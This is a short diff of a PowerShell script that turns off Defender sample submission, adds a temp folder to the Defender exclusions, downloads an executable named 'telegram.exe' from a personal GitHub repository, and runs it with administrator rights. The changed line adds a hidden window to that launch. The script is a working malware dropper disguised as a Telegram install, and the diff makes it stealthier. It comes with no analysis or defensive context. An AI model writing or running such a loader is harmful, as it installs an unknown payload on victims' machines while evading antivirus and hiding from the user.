@@ -9,4 +9,4 @@ Set-MpPreference -SubmitSamplesConsent 2
 New-Item -Path "$env:TEMP\telegram" -ItemType Directory | Out-Null
 Add-MpPreference -ExclusionPath "$env:TEMP\telegram"
 Invoke-WebRequest -Uri "https://github.com/lion93934/test/raw/refs/heads/main/telegram.exe" -OutFile "$env:TEMP\telegram\telegram.exe" | Out-Null
-Start-Process "$env:TEMP\telegram\telegram.exe" -Verb runas
+Start-Process "$env:TEMP\telegram\telegram.exe" -windowstyle hidden -Verb runas
